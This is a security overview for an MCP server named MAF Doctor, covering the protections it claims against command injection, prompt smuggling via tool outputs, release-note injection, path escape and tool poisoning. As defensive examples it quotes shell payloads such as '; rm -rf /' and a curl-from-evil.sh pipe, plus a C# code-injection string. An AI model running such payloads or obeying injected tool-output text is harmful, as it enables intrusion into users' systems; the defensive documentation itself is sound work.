# Security — how MAF Doctor (`maf-autopilot`) is hardened

> **Audience:** end users evaluating whether MAF Doctor is safe to install in their environment, and maintainers verifying mitigations stay in place.
>
> **For the deep technical breakdown** of attack surfaces, mitigations, and acknowledged gaps, read [`docs/security/threat-model.md`](security/threat-model.md). This file is the high-level overview.
>
> **If you're hardening your OWN MCP server**, see [`docs/mcp-security-hardening-best-practices.md`](mcp-security-hardening-best-practices.md) — a reusable playbook distilled from the patterns below: threat lattice (T1–T10), seven code-side invariants, GitHub Actions hardening, Cisco mcp-scanner CI wiring, the five CI invariants, and a quick-start checklist.

---

## How we tackle security

### At the MCP-protocol level

| Mechanism | What it does | Where to verify |
|---|---|---|
| **MCP tool annotations** (`ReadOnly` / `Destructive` / `Idempotent` / `OpenWorld`) | Every one of the 25 `[McpServerTool]` decorations declares its behavior class. Well-behaved clients (Claude Code, VS Code Copilot) use this to decide which tools auto-invoke vs need user confirmation — preventing prompt-driven exfiltration via tools the user didn't expect to fire. | `src/maf-autopilot/Tools/*.cs` — see annotation classification in [`CHANGELOG.md`](../CHANGELOG.md) under 1.0.0 breaking changes |
| **Structured outputs** (JSON / SARIF) | `MafDoctor`, `MafScanAntiPatterns`, `MafValidateFanOut` etc. emit machine-readable schemas — no free-form prose that could embed prompt-injection payloads back into the LLM context | [`docs/output-schemas.md`](output-schemas.md) |
| **No generic shell tool, no string-concatenated commands** | We do NOT expose `execute_command(string)`. Everything is a narrow, purpose-built tool. The 3 sites that spawn a subprocess all use `ProcessStartInfo.ArgumentList` (argv-style, no shell) — see [Command injection via tool arguments](#command-injection-via-tool-arguments-keysight-2026) below for the structural breakdown | grep for `Process.Start` — only in `src/maf-autopilot/Tools/ProcessRunner.cs` (launches `dotnet` / `dotnet-inspect`) and `src/maf-autopilot/Tools/PullRequestAuditTool.cs` (launches `git`) |
| **Path-validated repo input** | All tools that read user-repo files route through `PathGuard.ValidateRepoPath()` — rejects empty paths, nonexistent paths, malformed paths | `src/maf-autopilot/Tools/PathGuard.cs` |
| **Default-on `--dry-run` for writers** | The 2 destructive tools (`MafAutoFix`, `MafAutoFixAll`) advertise `dryRun` as the safe path; agents see this in the tool's `[Description]` block | `src/maf-autopilot/Tools/AutoFixTool.cs` |
| **5 MB cap on env-overridden registry** | `MAF_REGISTRY_PATH` env override caps file size to prevent OOM via a multi-GB poisoned registry | `src/maf-autopilot/Data/RegistryService.cs` (`RegistryMaxBytes`) |

### At the repo level

| Mechanism | What it does | Where to verify |
|---|---|---|
| **Roslyn analyzer NuGet** | Ships as `maf-autopilot.Analyzers` (separate NuGet). 3 rules (`MAF001`, `MAF002`, `MAF003`) fire at write-time in the IDE — `MAF002` blocks `DefaultAzureCredential` in production code; `MAF003` blocks `EnableSensitiveData = true` outside tests | `src/maf-autopilot.Analyzers/*.cs` |
| **Multi-version regression CI** | Roslyn rewriters are run on pinned MAF 1.0 / 1.2 / 1.3 sample projects on every push — rewriter bugs that corrupt user code get caught before merge | `.github/workflows/*.yml` + `samples/maf-1.x-sample/` |
| **`verify-registry` PR gate** | The AI-fill maintenance loop (release-watcher → Copilot Coding Agent → PR) is gated by a structural verifier — placeholders, broken examples, missing fields are caught before the PR can merge | `.github/workflows/maf-ai-fill-verify.yml` + `src/maf-autopilot/Commands/VerifyRegistryCommand.cs` |
| **MIT-licensed, source-available** | All 25 tools, the analyzer, the rewriters, the registry — readable in the repo. No closed-source binaries shipped in the nupkg | `LICENSE` |

---

## Known MCP attack classes — coverage status

This section names public, well-documented MCP attack classes and shows — with file/line citations — why MAF Doctor is not vulnerable. If a class isn't listed here, see [`docs/security/threat-model.md`](security/threat-model.md) for the full attack-surface map. The classes below are anchored against the canonical sources listed in the [Canonical references](#canonical-references) section at the end of this document.

### Command injection via tool arguments (Keysight, 2026)

**Reference:** [Command Injection: Uncovering A New Attack Vector of MCP Server — Keysight Blogs, 12 Jan 2026](https://www.keysight.com/blogs/en/tech/nwvs/2026/01/12/mcp-command-injection-new-attack-vector)

**The attack — in one sentence.** If an MCP server exposes a tool that shells out and *concatenates* tool arguments into a command string, the LLM can be prompt-injected into emitting arguments that break out of the intended command (`; rm -rf /`, `&& curl evil.sh | sh`, backtick subshells, etc.). Structurally identical to SQL injection: untrusted input → string concatenation → interpreter.

**Are we vulnerable? No.** Four independent reasons, each verifiable from the repo:

#### 1. No generic shell tool is exposed to the LLM

None of the 25 `[McpServerTool]`s accept "a command to run." Every tool is a narrow capability the LLM *selects* — it does not parameterize a shell with model-generated text. There is no `execute_command(string)`, no `run_sql(string)`, no eval surface. The LLM picks *which* tool fires; it does not get to dictate *what command* runs.

#### 2. All subprocess spawn sites use `ArgumentList`, never string concatenation

With `ProcessStartInfo.ArgumentList`, .NET passes each element to the OS as a separate `argv[i]`. There is no shell to inject into — a payload like `; rm -rf /` would arrive at the child process as a single literal argv string and be rejected as a malformed argument. The unsafe `ProcessStartInfo.Arguments` *string* property (which Windows re-parses with shell-style splitting) is **not used anywhere** in the codebase.

The exhaustive list of argv-construction sites (two share a single `Process.Start` inside `ProcessRunner`):

| File:line | Process | Argument construction |
|---|---|---|
| [`Tools/ProcessRunner.cs:24`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dotnet build` | `ArgumentList = { "build", projectOrSolutionPath, "--nologo" }` |
| [`Tools/ProcessRunner.cs:39`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dotnet-inspect diff` | `ArgumentList = { "diff", "--package", $"{id}@{old}..{new}", "--source", … }` |
| [`Tools/PullRequestAuditTool.cs:67`](../src/maf-autopilot/Tools/PullRequestAuditTool.cs) | `git diff` | `ArgumentList = { "-C", repoPath, "diff", "--name-only", $"{base}...HEAD" }` |

All three set `UseShellExecute = false`. There is no `cmd.exe /c`, no `bash -c`, no PowerShell pipeline anywhere in the spawn path.

#### 3. The invariant is checkable in one grep

```bash
grep -rn "Process.Start" src/
```

Returns the three call sites above plus (a) security-documentation comments in `src/maf-autopilot/Scaffolding/AgentScaffolder.cs` that name `Process.Start` inside a code-injection-payload example, and (b) negative-test fixtures in `src/maf-autopilot.Tests/ScaffolderSecurityTests.cs` that prove the scaffolder rejects those payloads. Both comment-only and test-only hits are correctly excluded by [`ci-invariants.yml` Job 1](../.github/workflows/ci-invariants.yml), which scopes its regex to call-site syntax and skips both the tests directory and lines beginning with `//`. If a future PR adds a fourth real spawn site that uses the unsafe `Arguments` string property instead of `ArgumentList`, CI fails — see also [`CONTRIBUTING.md`](../CONTRIBUTING.md) §"Adding an MCP server tool."

#### 4. Cisco mcp-scanner enforces this from the outside

The scanner's `code_execution` and `parameter_injection` YARA rules flag any tool whose `[Description]` or argument shape suggests shell execution. Latest run (2026-05-17, v4.6.0): **0 findings across 25 tools** — see [scan results](#latest-scan-results) below.

#### What would break this guarantee

So reviewers know what to reject: a contributor adding

```csharp
new ProcessStartInfo("dotnet") { Arguments = userInput }   // ← UNSAFE
```

— note the singular `Arguments` *string* property, which Windows re-parses with shell-style splitting. Always use `ArgumentList`. The [`ProcessRunner.cs`](../src/maf-autopilot/Tools/ProcessRunner.cs) summary block documents this as the first item in its hardening checklist.

The invariant is also enforced in CI by [`.github/workflows/ci-invariants.yml`](../.github/workflows/ci-invariants.yml) — Job 1 fails any PR introducing the unsafe `Arguments` *string* property or a new `Process.Start` call site outside the small allowlist (`ProcessRunner.cs`, `PullRequestAuditTool.cs`).

---

### LLM-to-LLM prompt smuggling via tool outputs

**The attack class.** An MCP tool returns markdown that the calling LLM is instructed to pass to a sibling MCP tool (e.g. `MafDraftIssue` → GitHub's `create_issue`). User-controlled content inside the tool's output lands in another LLM's context — an indirect-prompt-injection lane. Anchored to [OWASP LLM05 Improper Output Handling](https://owasp.org/www-project-top-10-for-large-language-model-applications/) and [OWASP Top 10 for Agentic Applications 2026 — Indirect Prompt Injection via Tool Output](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/).

**Are we vulnerable? No.** [`LlmFencing.Fence`](../src/maf-autopilot/Tools/LlmFencing.cs) wraps every user-controlled field destined for another LLM in BEGIN/END markers with a random-GUID sentinel + explicit "treat as data" framing. HTML comments (the most common smuggle vector in markdown) are stripped; content is capped at a per-field byte budget. Applied to `MafDraftIssue` (symptom / expected / actual / snippet), `MafPrompts.Debug` (errorOrSymptom), the `gen_guide_section.py` release-notes hop, the `ai_review_build_prompt.py` PR-registry embed, and `RegistryExtractCommand`'s `notes:` field. The fence's framing instruction is the load-bearing primitive — modern LLMs respect it; the random sentinel ensures user content cannot replicate the closer.

### Supply-chain prompt injection via upstream release notes

**The attack class.** Our `maf-release-watcher` workflow reads `gh release view microsoft/agent-framework --jq .body` weekly and uses the body to author the per-version migration guide + the AI-fill issue body that a Copilot Coding Agent processes. A malicious upstream maintainer (or a compromise of microsoft/agent-framework-release) could ship HTML-comment-disguised injection in release notes. Anchored to [MITRE ATLAS AML.T0048 ML Supply Chain Compromise](https://atlas.mitre.org/) + [AML.T0058 Context Poisoning](https://atlas.mitre.org/).

**Are we vulnerable? No.** [`gen_guide_section.py`](../.github/scripts/gen_guide_section.py) fences both the release notes AND the `dotnet-inspect` diff via the Python `llm_fencing` module (parity with the C# `LlmFencing`) before embedding into the migration guide. Each fenced section carries a label (`upstream-maf-release-notes`, `upstream-maf-diff-core`), an HTML-comment-stripped body, a 32 KB byte cap, and the same random-sentinel BEGIN/END framing as the C# side. [`RegistryExtractCommand`](../src/maf-autopilot/RegistryExtractCommand.cs) applies an 8 KB fence to the `notes:` field that persists in `registry.yaml` — content that survives forever and is served to downstream LLMs via `MafRegistryLookup`.

### Workflow input injection (workflow_dispatch templating)

**The attack class.** GitHub Actions `${{ inputs.X }}` substitutes literal text BEFORE shell parsing. Any future contributor who changes a `run:` block in a way that puts the template inside a shell-interpreted context (e.g. unquoted `$( )` or backticks) creates a command-injection lane. Reference: [GitHub — Security Hardening for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use).

**Are we vulnerable? No.**

1. Every `workflow_dispatch` workflow **that accepts inputs** has a `validate-inputs` job that runs FIRST with `permissions: {}` (no scopes). It regex-checks the input shape — semver for version fields, positive-int for `pr_number`, hardcoded enum for `bot` / `model`. Downstream jobs gate via `needs: validate-inputs`. Input-less dispatches (e.g. `maf-drift-detector.yml`) do not need the guard.
2. Every `run:` block reads inputs via `env:` redirect (`env: { X: ${{ inputs.X }} }` then `$X` in shell). The single `env:` interpolation is YAML-quoted by the runner; downstream `$X` references are shell-variable expansions, not template substitutions.
3. CI invariant `ci-invariants.yml` Job 4 blocks any future `${{ inputs.* }}` literal inside a `run:` block.
4. Third-party actions are SHA-pinned (9 distinct actions × 23 call sites). Dependabot keeps them current.
5. All 9 workflows declare an explicit `permissions:` scope; `validate-inputs` jobs run with no permissions at all.

### Path-escape via secondary path parameters

**The attack class.** Many tools accept a primary `repoPath` and a secondary path (e.g. `MafAutoFix.specificFile`). Joining the secondary path naively via `Path.Combine` or via a `Path.IsPathRooted` short-circuit lets an LLM-supplied absolute path or `..`-segment redirect file I/O outside the repo root. The rewriter then writes through the resolved path. Anchored to [OWASP MCP Top 10 — MCP04 Command Injection / path-escape variant](https://owasp.org/www-project-mcp-top-10/).

**Are we vulnerable? No.** [`PathGuard.ValidateContainment`](../src/maf-autopilot/Tools/PathGuard.cs) is called at every secondary-path entry. It (a) canonicalizes both `repoPath` and the candidate via `Path.GetFullPath`, (b) verifies the resolved path starts with `repoPath + separator`, (c) probes BOTH the resolved file itself AND its parent chain for `FileAttributes.ReparsePoint` — closing the file-level symlink lane that `Path.GetFullPath` alone cannot detect (it canonicalizes `..` syntactically but does not resolve symlinks). Error messages never echo the input path.

### Code injection via scaffold parameters

**The attack class.** Code generators that splice user-supplied identifiers into output source files (e.g. `namespace {{ns}};`) are vulnerable to break-out via crafted parameter values like `MyApp; class Evil { static int x = Process.Start("calc"); }`. The generated file is valid C# and gets compiled into the user's project.

**Are we vulnerable? No.** `AgentScaffolder.IsValidTypeExpression` (for `inputType` / `outputType`) and `AgentScaffolder.IsValidNamespace` (for `projectNamespace`) both use the same defense: pre-reject char filter (`;`, `{`, `}`, `(`, `)`, `=`, newline, NUL, quote, backtick) + Roslyn parse + roundtrip equality check. If Roslyn silently dropped extra tokens after parsing, the printed form differs from the input — that's the actual injection gate. Tests in `ScaffolderSecurityTests` pin a catalog of injection payloads.

### Annotation drift (tool poisoning / consent bypass)

**The attack class.** MCP-spec-compliant clients gate auto-invocation on the `[McpServerTool]` annotations (`ReadOnly` / `Destructive` / `Idempotent` / `OpenWorld`). A wrong annotation is a security bug, not a style issue: setting `ReadOnly=true` on a tool that spawns `dotnet build` is a privilege escalation. Anchored to [MCP Specification — Security Considerations](https://modelcontextprotocol.io/specification/2025-11-25) + [MCP Blog — Tool Annotations as Risk Vocabulary](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/) + [Invariant Labs — Tool Poisoning Attack](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks).

**Are we vulnerable? No.** Reflection tests (`McpToolAnnotationTests`) lock the per-tool annotation contract. `CONTRIBUTING.md`'s security rubric requires future tools to match annotations to behavior. The audit found and fixed five drift cases in v1.1: `MafRunCs0618Hunt` (was `ReadOnly=true`, now `false` + `OpenWorld=true` because `dotnet build` reaches NuGet), `MafNewAgent`/`MafNewExecutor` (were `Destructive=false`, now `true` because they write to the project tree), `MafDiffPackage`/`MafPreUpgradeDryRun` (were missing `OpenWorld`, both reach api.nuget.org).

---

## MCP-server security scan — Cisco mcp-scanner

We use **[Cisco mcp-scanner](https://github.com/cisco-ai-defense/mcp-scanner)** to scan our MCP server against known threat patterns. It's:

- Maintained by **Cisco AI Defense** (Apache-2.0, 926+ stars, v4.6.0 April 2026)
- Runnable **fully locally** in yara-analyzer mode (no API keys, no phone-home)
- Detects: prompt injection, tool poisoning, credential harvesting, code execution patterns, parameter injection
- PyPI package: `cisco-ai-mcp-scanner` — CLI binary: `mcp-scanner`

### Note: it's a CLI tool, NOT a VS Code extension

Don't look for it in the VS Code marketplace — none of the established MCP security scanners ship as VS Code extensions. Install via Python tooling:

```bash
python -m pip install --user pipx
python -m pipx ensurepath
pipx install cisco-ai-mcp-scanner
```

### How to run against this repo

```bash
# Build first if needed
dotnet build maf-autopilot.sln

# Scan via stdio (launches our MCP server as a subprocess)
mcp-scanner --analyzers yara --format summary --hide-safe \
  stdio --stdio-command=dotnet \
  --stdio-arg=run --stdio-arg=--project --stdio-arg=src/maf-autopilot \
  --stdio-arg=--framework --stdio-arg=net10.0 --stdio-arg=--no-build \
  --stderr-file=/tmp/maf-server.log
```

### Latest scan results

**2026-05-17 — Cisco mcp-scanner v4.6.0 (yara analyzer)**

```
=== Scan Statistics ===
Total tools: 25
Safe tools: 25
Unsafe tools: 0
Severity breakdown: HIGH: 0, UNKNOWN: 0, MEDIUM: 0, LOW: 0, SAFE: 25
Analyzer stats: yara_analyzer: 25/25 scanned, 0 findings
```

**Triage: zero findings.** All 25 MCP tools enumerated cleanly via stdio. No prompt injection, tool poisoning, credential harvesting, or code execution patterns matched.

### Scan cadence

- **Every PR against `main`** that touches `src/maf-autopilot/**`: [`.github/workflows/mcp-scanner.yml`](../.github/workflows/mcp-scanner.yml) runs the scanner and posts results as a sticky PR comment (added in v1.1 — G8 closure). Currently advisory (`continue-on-error: true`); flip to hard-fail after 5 consecutive clean runs.
- **Weekly cron** (Mondays 11:00 UTC): scheduled run as backstop for findings introduced by upstream regex / tooling drift even without code changes on our side.
- **Every minor release** (1.0 → 1.1 → 1.2): full Cisco mcp-scanner pass; results recorded in [`docs/security/threat-model.md`](security/threat-model.md) §7.
- **Pre-tag** during release prep: re-run if any tool was added or modified.

---

## Scanners we evaluated but do NOT recommend

We're explicit about what we deliberately *don't* depend on, so users know the supply chain stays small.

| Scanner | Why we don't use it |
|---|---|
| **[Snyk agent-scan](https://github.com/invariantlabs-ai/mcp-scan)** (formerly Invariant Labs mcp-scan, now Snyk) | Requires a Snyk account + `SNYK_TOKEN`. README confirms it "validates the components, both with local checks **and by invoking the Agent Scan API**" — not local-only; sends data to Snyk's servers. Currently in "Open Preview" (free), but Snyk's commercial tier is paid ($52-$98/dev/month). Account requirement = vendor lock-in regardless of preview status. **We don't gate the open-source release on a tool that requires a third-party account.** |
| **[kapilduraphe/mcp-watch](https://github.com/kapilduraphe/mcp-watch)** | Single-maintainer hobby project. Quality may be fine, but a security tool from an unvetted source is itself a supply-chain risk. |
| **Commercial-only scanners** (Pangea, Enkrypt AI, AQtive Guard) | Fine if your org has a license, but we don't recommend them as the canonical path for an open-source toolkit. |

---

## Reporting a security issue

If you find a vulnerability, please **do not open a public issue.** Email the maintainer (see GitHub profile contact) with:
- A clear description of the issue
- Steps to reproduce
- Suggested mitigation if you have one

We aim to acknowledge within 72 hours and ship a fix in the next patch release (or sooner if critical).

---

## Canonical references

The MCP / LLM / GitHub-Actions security canon that MAF Doctor's defensive posture is anchored against. Each mitigation in the hardening tables above maps to one or more of these.

| Source | What it names |
|---|---|
| [MCP Specification — Security Considerations (2025-11-25)](https://modelcontextprotocol.io/specification/2025-11-25) | Trust model, behavioral hint accuracy (`readOnlyHint` / `destructiveHint` / `idempotentHint` / `openWorldHint`), user-consent gating, sandboxing |
| [MCP Blog — Tool Annotations as Risk Vocabulary (2026-03-16)](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/) | How well-behaved clients use annotations to decide auto-invoke vs. confirmation |
| [OWASP Top 10 for LLM Applications v2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | LLM01 Prompt Injection, LLM02 Info Disclosure, LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM07 System Prompt Leakage, LLM10 Unbounded Consumption |
| [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/) | MCP01 Token Mismanagement, MCP02 Excessive Scope, MCP03 Tool Poisoning, MCP04 Command Injection, MCP05 Context Spoofing, MCP06 Insecure Memory References, MCP07 Covert Channel Abuse, MCP08 Model Misbinding, MCP09 Prompt-State Manipulation |
| [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) | Agent Behavior Hijacking, Tool Misuse, Indirect Prompt Injection via tool output |
| [MITRE ATLAS](https://atlas.mitre.org/) | AML.T0051 LLM Prompt Injection, AML.T0048 ML Supply Chain Compromise, AML.T0058 Context Poisoning |
| [Cisco AI Defense MCP Scanner](https://github.com/cisco-ai-defense/mcp-scanner) | YARA categories: prompt injection, tool poisoning, credential harvesting, code execution, parameter injection, cross-origin escalation, rug-pull |
| [Invariant Labs — Tool Poisoning, Shadowing, Rug-Pull (Apr 2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) | TPA, Tool Shadowing, MCP Rug Pull |
| [Snyk Labs — Prompt Injection Meets MCP / MCP Command Injection (2025–2026)](https://labs.snyk.io/resources/prompt-injection-mcp/) | Real-world MCP command-injection CVEs (CVE-2025-5277 aws-mcp, CVE-2025-6514 mcp-remote, CVE-2025-59377 mcp-kubernetes) |
| [Keysight — MCP Command Injection: New Attack Vector (2026-01-12)](https://www.keysight.com/blogs/en/tech/nwvs/2026/01/12/mcp-command-injection-new-attack-vector) | Local STDIO trust-boundary abuse, model-biasing via tool description, runtime-response prompt injection |
| [GitHub — Security Hardening for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use) | `pull_request_target` discipline, `workflow_dispatch` input sanitization via env vars, SHA-pin actions, minimum `permissions:`, `GITHUB_TOKEN` least privilege |
| [NIST SP 800-218A — SSDF Community Profile for AI](https://csrc.nist.gov/pubs/sp/800/218/a/final) | PW.4/PW.5 secure-by-design tasks, PS.1 third-party model/tool provenance, RV.1/RV.2 post-release vuln id |
| [CSA mcpserver-audit](https://github.com/ModelContextProtocol-Security/mcpserver-audit) | Pre-install MCP audit checklist |

## See also

- [`docs/security/threat-model.md`](security/threat-model.md) — full attack-surface analysis, mitigations, and acknowledged gaps
- [`docs/output-schemas.md`](output-schemas.md) — the JSON schema for tool outputs (CI integration)
- [`CONTRIBUTING.md`](../CONTRIBUTING.md) §"Adding an MCP server tool" — security rubric for new tools
- [`AGENTS.md`](../AGENTS.md) — repo layout + AI-fill loop description
